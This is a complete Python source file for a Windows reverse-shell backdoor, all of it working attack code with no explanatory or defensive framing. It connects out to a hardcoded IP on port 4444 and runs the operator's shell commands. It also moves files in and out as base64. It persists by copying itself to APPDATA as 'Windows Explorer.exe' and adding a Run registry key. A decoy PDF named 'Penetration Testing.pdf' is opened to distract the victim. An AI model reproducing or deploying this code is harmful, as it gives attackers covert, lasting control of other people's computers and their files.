import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8') if isinstance(data, bytes) else data)
        self.connection.send(json_data.encode('utf-8'))

    def become_persistent(self):
        evil_file_location = os.path.join(os.environ["APPDATA"], "Windows Explorer.exe")
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d " ' + evil_file_location + '" ', shell=True)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            return str(e).encode('utf-8')

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, path):
        if os.path.exists(path):
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        return "[-] File not found.".encode('utf-8')

    def write_file(self, path, content):
        if isinstance(content, str):
            content = content.encode('utf-8')
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[-] Error during command execution: {str(e)}"
            self.reliable_send(command_result)


file_name = os.path.join(sys._MEIPASS, "Penetration Testing.pdf") if hasattr(sys, '_MEIPASS') else "Penetration Testing.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.101.111", 4444) 
    my_backdoor.run()
except Exception as e:
    sys.exit()